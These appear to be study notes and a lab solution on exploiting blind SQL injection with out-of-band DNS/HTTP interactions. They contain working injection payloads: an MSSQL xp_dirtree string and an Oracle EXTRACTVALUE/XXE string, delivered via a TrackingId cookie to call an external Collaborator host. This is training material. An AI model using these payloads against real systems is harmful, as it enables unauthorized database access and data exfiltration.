# Exploiting blind SQL injection using out-of-band (OAST) techniques
- suppose that the application carries out the same SQL query, but does it asynchronously
- The application continues processing the user's request in the original thread
- and uses another thread to execute a SQL query using the tracking cookie
- query is still vulnerable to SQL injection, however none of the techniques described so far will work
- the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query
- it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control
- these can be triggered conditionally, depending on an injected condition
- to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself
- variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service).
- This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems
- easiest and most reliable way to use out-of-band techniques is using Burp Collaborator
- This is a server that provides custom implementations of various network services (including DNS)
- allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application
- techniques for triggering a DNS query are highly specific to the type of database being used. On Microsoft SQL Server
```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```
- This will cause the database to perform a lookup for the following domain
```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```
# Lab: Blind SQL injection with out-of-band interaction
- lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie
- SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain
# Goal
- exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
# Solving the Lab
```
2ilromf3sqxm7kvafcdz0q3dh4nvblza.oastify.com
```
-  use Burp Suite to intercept and modify the request containing the TrackingId cookie
-  Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server
```
' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://2ilromf3sqxm7kvafcdz0q3dh4nvblza.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```
- and we solved the lab
